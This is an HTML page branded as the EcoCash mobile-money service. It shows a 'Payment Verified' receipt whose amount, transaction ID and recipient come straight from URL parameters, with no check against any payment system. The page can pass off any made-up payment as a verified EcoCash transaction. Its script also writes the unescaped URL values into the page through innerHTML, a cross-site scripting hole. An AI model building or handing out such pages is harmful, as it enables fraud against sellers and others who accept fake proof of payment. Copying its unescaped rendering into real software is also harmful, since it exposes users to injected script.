<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>EcoCash · Payment Verified</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
  :root {
    --eco-blue: #0066A6;
    --eco-red: #E31E24;
    --eco-green: #00A651;
    --eco-navy: #101828;
    --eco-muted: #667085;
    --eco-border: #E5E7EB;
    --eco-soft: #F5F7F9;
    --eco-bg: #F8FAFC;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: var(--eco-bg); color: var(--eco-navy);
    -webkit-font-smoothing: antialiased; line-height: 1.5;
    min-height: 100vh; padding: 24px 16px 48px;
  }
  .wrap { max-width: 480px; margin: 0 auto; }

  /* Header */
  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
  .brand { display: inline-flex; align-items: baseline; gap: 0; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
  .brand .eco { color: var(--eco-blue); }
  .brand .cash { color: var(--eco-red); }
  .header .label {
    font-size: 11px; font-weight: 700; text-transform: uppercase;
    letter-spacing: 0.7px; color: var(--eco-muted);
  }

  /* Card */
  .card {
    background: #fff; border-radius: 20px; border: 1px solid var(--eco-border);
    box-shadow: 0 10px 30px rgba(17,24,39,0.06);
    overflow: hidden;
  }

  /* Success header */
  .success-head {
    padding: 34px 24px 26px;
    text-align: center;
    background: linear-gradient(180deg, #F1FBF5 0%, #FFFFFF 100%);
    border-bottom: 1px solid var(--eco-border);
  }
  .tick {
    width: 84px; height: 84px; border-radius: 50%;
    background: var(--eco-green); color: #fff;
    display: inline-flex; align-items: center; justify-content: center;
    margin-bottom: 18px;
    box-shadow: 0 0 0 8px rgba(0,166,81,0.12), 0 10px 22px rgba(0,166,81,0.28);
  }
  .tick svg { width: 40px; height: 40px; }
  .tick svg path { stroke: #fff; stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round; fill: none; }
  .success-title { font-size: 20px; font-weight: 800; letter-spacing: -0.4px; margin-bottom: 6px; }
  .success-desc { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }

  /* Amount block */
  .amount-block {
    padding: 22px 24px;
    text-align: center;
    border-bottom: 1px solid var(--eco-border);
  }
  .amount-label {
    font-size: 11.5px; font-weight: 700; color: var(--eco-muted);
    text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 6px;
  }
  .amount-value {
    font-size: 34px; font-weight: 800; letter-spacing: -1.2px;
    color: var(--eco-navy); line-height: 1.1;
  }
  .amount-value .cur {
    font-size: 16px; font-weight: 700;
    color: var(--eco-blue); margin-right: 6px;
  }

  /* Details rows */
  .details {
    padding: 4px 24px;
  }
  .row {
    display: flex; justify-content: space-between; align-items: flex-start;
    gap: 14px; padding: 12px 0;
    border-bottom: 1px solid #F0F2F6;
  }
  .row:last-child { border-bottom: none; }
  .row .k { font-size: 12.5px; color: var(--eco-muted); flex-shrink: 0; }
  .row .v {
    font-size: 13px; font-weight: 600; text-align: right;
    word-break: break-word; color: var(--eco-navy);
  }
  .row .v.mono {
    font-family: "SF Mono", Monaco, "Cascadia Code", monospace;
    font-size: 12px; letter-spacing: 0.3px;
    background: var(--eco-soft); padding: 3px 8px; border-radius: 6px;
    border: 1px solid var(--eco-border);
  }
  .row .v.success { color: var(--eco-green); }

  /* Footer */
  .card-foot {
    padding: 18px 24px 22px;
    border-top: 1px solid var(--eco-border);
    background: #FBFCFE;
    text-align: center;
  }
  .card-foot .brand { font-size: 16px; margin-bottom: 4px; display: inline-flex; }
  .card-foot .small { font-size: 11px; color: var(--eco-muted); }

  /* Buttons */
  .actions {
    display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
    margin-top: 16px;
  }
  .btn {
    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
    padding: 13px; border-radius: 12px;
    font-size: 13.5px; font-weight: 700; font-family: inherit;
    cursor: pointer; transition: all .15s; border: 1.5px solid transparent;
  }
  .btn-primary { background: var(--eco-blue); color: #fff; border-color: var(--eco-blue); }
  .btn-primary:hover { filter: brightness(1.08); }
  .btn-outline { background: #fff; color: var(--eco-blue); border-color: #CBD5E1; }
  .btn-outline:hover { border-color: var(--eco-blue); background: #F0F6FC; }

  .page-foot {
    text-align: center; margin-top: 18px;
    font-size: 11px; color: var(--eco-muted); line-height: 1.6;
  }

  /* Error state */
  .error-box { padding: 40px 24px; text-align: center; }
  .error-icon {
    width: 72px; height: 72px; border-radius: 50%;
    background: #FEE2E2; color: var(--eco-red);
    display: inline-flex; align-items: center; justify-content: center;
    font-size: 34px; font-weight: 800; margin-bottom: 16px;
  }
  .error-box h2 { font-size: 18px; font-weight: 800; margin-bottom: 6px; }
  .error-box p { font-size: 13px; color: var(--eco-muted); }

  /* Toast */
  .toast {
    position: fixed; bottom: 24px; left: 50%;
    transform: translateX(-50%) translateY(80px);
    background: var(--eco-navy); color: #fff;
    padding: 11px 18px; border-radius: 9px;
    font-size: 12.5px; font-weight: 600;
    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    opacity: 0; transition: all .3s ease; z-index: 100; pointer-events: none;
    max-width: 90%; text-align: center;
  }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

  @media (max-width: 380px) {
    .amount-value { font-size: 28px; }
    .success-title { font-size: 18px; }
    .actions { grid-template-columns: 1fr; }
  }
</style>
</head>
<body>

<div class="wrap">

  <div class="header">
    <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
    <span class="label">Verified</span>
  </div>

  <div class="card" id="card">

    <div class="success-head">
      <div class="tick">
        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12.5l4.2 4.2L19 7"/></svg>
      </div>
      <div class="success-title">Payment Verified</div>
      <div class="success-desc">Your transaction was approved and verified.</div>
    </div>

    <div class="amount-block">
      <div class="amount-label">Amount approved</div>
      <div class="amount-value">
        <span class="cur" id="amtCur">USD</span><span id="amtVal">0.00</span>
      </div>
    </div>

    <div class="details" id="details">
      <!-- rows injected by script -->
    </div>

    <div class="card-foot">
      <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
      <div class="small">Powered by EcoCash · Secure Payment</div>
    </div>

  </div>

  <div class="actions">
    <button class="btn btn-outline" onclick="window.print()">🖨 Print Receipt</button>
    <button class="btn btn-primary" onclick="copyReceipt()">📋 Copy Details</button>
  </div>

  <div class="page-foot">
    This receipt was generated by EcoCash after successful verification.<br>
    Keep it for your records.
  </div>

</div>

<div class="toast" id="toast"></div>

<script>
  /* ============================================================
     Read transaction data from the URL
     pay.html redirects with: ?tx=…&am=…&cur=…&rn=…&c=…
  ============================================================ */
  const params = new URLSearchParams(window.location.search);
  const data = {
    tx:  params.get('tx')  || '',
    am:  params.get('am')  || '0',
    cur: params.get('cur') || 'USD',
    rn:  params.get('rn')  || '',
    c:   params.get('c')   || ''
  };

  function formatDate(ts) {
    const d = ts ? new Date(ts) : new Date();
    return d.toLocaleString(undefined, {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
  }

  function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg; t.classList.add('show');
    clearTimeout(t._timer);
    t._timer = setTimeout(() => t.classList.remove('show'), 2200);
  }

  /* ============================================================
     Render details
  ============================================================ */
  function render() {
    if (!data.tx) {
      document.getElementById('card').innerHTML = `
        <div class="error-box">
          <div class="error-icon">!</div>
          <h2>Missing transaction</h2>
          <p>Please return to the payment page and try again.</p>
        </div>`;
      return;
    }

    document.getElementById('amtCur').textContent = data.cur;
    document.getElementById('amtVal').textContent = Number(data.am || 0).toFixed(2);

    const rows = [
      { k: 'Status',         v: 'Payment Verified',            cls: 'success' },
      { k: 'Transaction ID', v: data.tx,                       mono: true },
      { k: 'Recipient',      v: data.rn || '—' },
      { k: 'Country',        v: data.c  || '—' },
      { k: 'Verified on',    v: formatDate() }
    ];

    const html = rows.map(r => {
      const cls = r.mono ? 'mono' : (r.cls || '');
      return `<div class="row">
        <span class="k">${r.k}</span>
        <span class="v ${cls}">${r.v}</span>
      </div>`;
    }).join('');

    document.getElementById('details').innerHTML = html;
  }

  /* ============================================================
     Copy + Print
  ============================================================ */
  function copyReceipt() {
    const lines = [
      'EcoCash Payment Verified',
      '========================',
      'Status: Payment Verified',
      'Amount: ' + data.cur + ' ' + Number(data.am || 0).toFixed(2),
      'Transaction ID: ' + data.tx,
      'Recipient: ' + (data.rn || '—'),
      'Country: ' + (data.c || '—'),
      'Verified on: ' + formatDate()
    ].join('\n');

    const done = () => showToast('Receipt copied to clipboard.');

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(lines).then(done).catch(() => {
        fallbackCopy(lines); done();
      });
    } else {
      fallbackCopy(lines); done();
    }
  }

  function fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select();
    try { document.execCommand('copy'); } catch (e) {}
    document.body.removeChild(ta);
  }

  render();
</script>
</body>
</html>
